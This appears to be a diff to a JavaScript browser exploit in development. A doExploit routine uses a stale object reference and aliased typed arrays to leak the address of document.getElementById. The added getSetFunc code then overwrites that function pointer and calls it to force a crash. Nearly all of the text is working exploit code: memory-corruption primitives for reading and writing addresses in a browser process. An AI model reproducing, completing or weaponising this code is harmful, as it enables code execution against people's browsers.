@@ -59,6 +59,12 @@ function allocBuffers() {
 	}
 }
 
+function paddr(lo, hi) {
+	var slo = ('00000000' + lo.toString(16)).slice(-8);
+	var shi = ('00000000' + hi.toString(16)).slice(-8);
+	return '0x' + shi + slo;
+}
+
 function doExploit(buf, stale, temp) {
 	function dump(name, buf, count) {
 		for(var j = 0; j < count; ++j)
@@ -268,7 +274,46 @@ function doExploit(buf, stale, temp) {
 		}
 	}
 
-	walkList();
+	function getSetFunc(func, nlo, nhi, off) {
+		off = off !== undefined ? off : 1;
+		eval('(function(x, o, v) { x[o] = v; })')(stale, off, func);
+		var lo = buf[6];
+		var hi = buf[7];
+		log('First addr ' + paddr(lo, hi));
+		eval('(function(x, o, v) { x[o] = v; })')(stale, off, temp);
+		buf[4] = lo;
+		buf[5] = hi;
+		buf[6] = 128;
+
+		lo = temp[4];
+		hi = temp[5];
+		log('Second addr ' + paddr(lo, hi));
+		buf[4] = lo;
+		buf[5] = hi;
+
+		dumptemp(64);
+		var foff = [0, 1];
+		lo = temp[foff[0]];
+		hi = temp[foff[1]];
+		//dumptemp(64);
+		if(nlo === undefined) {
+			log('Func addr ' + paddr(lo, hi));
+			return [lo, hi];
+		} else {
+			temp[foff[0]] = nlo;
+			temp[foff[1]] = nhi;
+			log('Patched function address from ' + paddr(lo, hi) + ' to ' + paddr(nlo, nhi));
+		}
+	}
+
+	//walkList();
+	//var arr = new Array(1);
+	//arr[0] = 0xDEADBEEF >>> 0;
+	var func = document.getElementById;//getElementById.bind(document);
+	var addr = getSetFunc(func, 0, 0);
+	//getSetFunc(func);
+	alert('Trying to crash...')
+	log(func.apply(document, ['foo']).id);
 
 	/*buf[4] = lo = 0x492cb000 >>> 0;
 	buf[5] = hi = 0x60;
